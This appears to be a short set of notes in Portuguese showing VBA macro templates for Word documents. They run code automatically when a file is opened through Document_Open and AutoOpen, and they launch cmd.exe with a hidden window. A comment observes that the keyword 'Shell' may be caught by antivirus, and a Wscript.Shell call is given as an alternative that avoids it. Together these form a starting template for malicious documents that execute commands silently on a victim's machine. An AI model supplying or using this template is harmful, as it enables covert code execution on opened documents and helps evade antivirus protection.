# Script inicial para execução automática

```vbnet
' Função utilizada para inicio automático ao abrir arquivo .doc
Sub Document_Open()
 Main
End Sub

' Função utilizada para inicio automático ao abrir arquivo .doc
Sub AutoOpen()
 Main
End Sub

' Início do programa
Sub Main()
 MsgBox ("This is a macro test")
End Sub
```

# Execução de programas

```vbnet
' Função utilizada para inicio automático ao abrir arquivo .doc
Sub Document_Open()
 Main
End Sub

' Função utilizada para inicio automático ao abrir arquivo .doc
Sub AutoOpen()
 Main
End Sub


Sub Main()
 ' Declara como uma palavra
 Dim str As String
 str = "cmd.exe"
 
 ' Executa o comando no terminal
 ' Levar em consideração que a palavra "Shell" pode ser detectada como maliosa em alguns antivirus
 Shell str, vbHide

 ' Outra forma de iniciar um programa não utilizando a palavra "Shell"
 CreateObject("Wscript.Shell").Run str, 0
End Sub
```